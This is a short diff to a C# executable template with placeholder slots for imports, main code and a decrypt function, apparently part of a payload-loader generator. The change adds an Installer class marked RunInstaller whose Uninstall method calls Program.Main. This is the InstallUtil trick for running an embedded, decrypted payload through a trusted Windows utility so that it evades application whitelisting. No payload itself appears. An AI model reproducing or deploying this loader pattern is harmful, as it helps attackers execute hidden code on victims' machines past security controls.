@@ -12,11 +12,21 @@ namespace exe
     class Program
     {
     	<IMPORTS>
-        static void Main(string[] args)
+        public static void Main()
         {
 		<MAIN>
         }
 	<DECRYPTFUNC>
     }
     <CLASSES>
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Loader : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            base.Uninstall(savedState);
+            Program.Main();
+        }
+    }
 }
